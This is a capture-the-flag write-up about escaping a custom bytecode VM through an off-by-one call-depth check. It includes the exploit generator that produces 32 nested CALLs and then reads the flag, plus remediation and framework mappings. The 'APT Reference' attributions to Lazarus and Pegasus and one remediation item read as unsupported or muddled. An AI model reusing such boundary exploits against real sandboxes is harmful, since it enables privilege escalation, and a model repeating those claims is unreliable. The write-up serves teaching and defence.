# Thirty-Two Steps Down

| Detail | Value |
|--------|-------|
| **CTF** | Pointer Overflow CTF 2026 |
| **Category** | Unknown |
| **Difficulty** | Unknown |
| **Points** | N/A |
| **Flag** | `poctf{dynamic}` |
| **Status** | Solved |

---

## Overview

This one is a proper VM sandbox escape, and honestly one of the most satisfying challenges in the entire CTF. The service hosts a custom stack-based virtual machine where players upload bytecode. The VM enforces a "sandbox" via call depth limits: kernel privileges (like reading the flag) are supposedly restricted to level 33, while user code maxes out at depth 32. The catch? A classic off-by-one vulnerability in the boundary check.

## Reconnaissance

The challenge provides `service.py`, the full source code of the VM (480 lines). Reading it carefully reveals the key mechanics:

- **Stack-based VM** with data stack and call stack
- **CALL** instruction increments `self.level` and pushes a return address
- **READ_HOST_FLAG** is marked as a "kernel privilege" operation
- `MAX_CALL_DEPTH = 32`

The crucial vulnerability lies in two checks:

```python
# CALL instruction (line ~258):
if self.level >= self.MAX_CALL_DEPTH:
    raise VMError("Maximum call depth exceeded")

# READ_HOST_FLAG instruction (line ~284):
if self.level < self.MAX_CALL_DEPTH:
    raise VMError("Insufficient privilege level")
```

See the bug? CALL refuses when `level >= 32`, but READ_HOST_FLAG succeeds when `level >= 32`. So if we make exactly 32 nested CALLs, we reach `level = 32` where CALL is blocked (can't go deeper) but READ_HOST_FLAG is allowed (we are at the boundary).

## The Exploit

The exploit is beautifully simple: 32 nested CALL labels, then READ_HOST_FLAG at the deepest level.

```python
def build_exploit():
    lines = []
    for i in range(32):
        lines.append(f"s{i}:")
        lines.append(f"CALL s{i+1}")
    lines.append("s32:")
    lines.append("READ_HOST_FLAG")
    lines.append("HALT")
    return "\n".join(lines)
```

This generates assembly like:

```
s0:
CALL s1
s1:
CALL s2
...
s31:
CALL s32
s32:
READ_HOST_FLAG
HALT
```

The assembler accepts text-based assembly terminated by an empty line. Each CALL bumps the level by 1. After 32 CALLs, we're at level 32, right at the kernel boundary.

## Local Verification

Before hitting the live service, we verified locally with `POCTF_DEV_MODE=1`:

```bash
export POCTF_DEV_MODE=1
python3 service.py
```

The dev mode flag `poctf{...}` was returned in 34 steps, confirming the exploit path works.

## Live Execution

```bash
python3 -I scripts/exploit.py <host> <port> <session_token>
```

The script connects to the service, authenticates with the session token, sends the exploit bytecode, and extracts the flag from the response.

## Key Takeaways

- **Off-by-one errors** are among the most common and dangerous vulnerability classes in software. The difference between `<` and `<=` (or `>=` vs `>`) can break an entire security boundary.
- The VM documentation says "maximum call depth 32" and "Level 33 is kernel," but the implementation allows level 32 to access kernel operations. The spec and the code disagree, and the code wins.
- Always verify sandbox boundaries by testing the exact boundary values, not just values clearly inside or outside the range.

---

## Captured Flags

| Type | Value | Found At | Method |
|---|---|---|---|
| Flag | `poctf{...}` | VM kernel memory (READ_HOST_FLAG) | Off-by-one sandbox escape via 32 nested CALLs |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Off-by-one in privilege boundary check | CVE-2021-22555 (Netfilter off-by-one) led to Linux kernel privilege escalation used in real attacks | The difference between `<` and `<=` can break an entire security model |
| 2 | Spec says "level 33 is kernel" but code allows level 32 | Documentation/code divergence is a common root cause in browser sandbox escapes (Chrome V8, Firefox SpiderMonkey) | Always audit the implementation, not the documentation |
| 3 | VM sandbox relies on a single integer check | Hardware TEEs (SGX, TrustZone) use layered enforcement; software VMs with single-check boundaries are fragile | Defense in depth: multiple independent checks for privilege transitions |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|---|---|---|---|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Execution | TA0002 | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Defense Evasion | TA0005 | Exploitation for Defense Evasion | T1211 |
| Collection | TA0009 | Data from Local System | T1005 |

> **APT Reference:** Lazarus Group (HIDDEN COBRA) has exploited off-by-one vulnerabilities in custom VM interpreters and sandbox environments to escape containment, notably in cryptocurrency exchange heists. The NSO Group's Pegasus spyware has used similar boundary-condition exploits in JavaScript engine VMs to achieve sandbox escape on iOS and Android.

---

## Remediation and Containment

### Technical Fixes

1. Fix the boundary check: `READ_HOST_FLAG` should require `self.level > self.MAX_CALL_DEPTH` (strictly greater than), or `CALL` should allow `self.level > self.MAX_CALL_DEPTH` (use consistent boundary semantics)
2. Implement defense in depth: add a separate capability flag that must be explicitly granted for kernel operations, independent of call depth
3. Add assertions and invariants: `assert self.level <= self.MAX_CALL_DEPTH` at every privilege-sensitive operation
4. Use formal verification or property-based testing to validate sandbox boundary conditions

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Audit all privilege boundary checks for off-by-one errors (compare `<` vs `<=`, `>` vs `>=`)
- Add runtime monitoring/alerting when privilege levels reach boundary values
- Review all CALL depth tracking logic for integer overflow or underflow
- Test sandbox boundaries with exact boundary values, not just values clearly inside or outside

**MITRE D3FEND countermeasures:**
- D3-EAL (Execution Allowlisting) to restrict executable bytecode to verified programs
- D3-SEA (System Call Enforcement Analysis) to monitor privilege level transitions
- D3-SBX (Sandbox Enforcement) to add independent containment layers

### Framework Alignment

**CWE:**
- CWE-193: Off-By-One Error
- CWE-269: Improper Privilege Management
- CWE-265: Privilege Issues (sandbox escape)

**OWASP Top 10 (2021):**
- A04:2021 Insecure Design (privilege boundary relies on a single integer comparison)
- A01:2021 Broken Access Control (sandbox bypass)

**NIST CSF 2.0:**
- Identify (ID.RA): Assess privilege escalation risk in all VM/sandbox implementations
- Protect (PR.AC): Implement multi-layered privilege enforcement, not single boundary checks
- Detect (DE.AE): Monitor for execution at exact boundary privilege levels
- Respond (RS.AN): Investigate scope of access after any sandbox escape detection
- Recover (RC.RP): Rotate all secrets accessible from kernel privilege level

**NIST SP 800-53 (Rev. 5):**
- SC-39: Process Isolation (enforce sandbox boundaries with multiple mechanisms)
- AC-6: Least Privilege (restrict kernel operations to explicitly privileged contexts)
- SI-16: Memory Protection (protect privilege-level state from user-controlled manipulation)
- SA-11: Developer Testing and Evaluation (boundary value testing)

**C2M2:**
- Domain: TECHNOLOGY (Cybersecurity Architecture)
- Practice: Implement secure software development practices including boundary testing
- Target MIL: MIL-3 (formal boundary testing and verification for privilege-sensitive code)

---

## Final Thoughts

Off-by-one bugs are the silent killers of security boundaries. This challenge is a masterclass in why you must test exact boundary values, not just the obvious inside/outside cases. When documentation says "level 33 is kernel" and the code says `>= 32`, the code wins. In production sandboxes, from browser JavaScript engines to cloud container runtimes, this exact class of bug has led to some of the most impactful exploits in recent memory.

Thanks guys!! (❍ᴥ❍ʋ)

---

Sandbox escapes are where the fun really begins. If this off-by-one walkthrough gave you that "aha" moment, spread the word.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
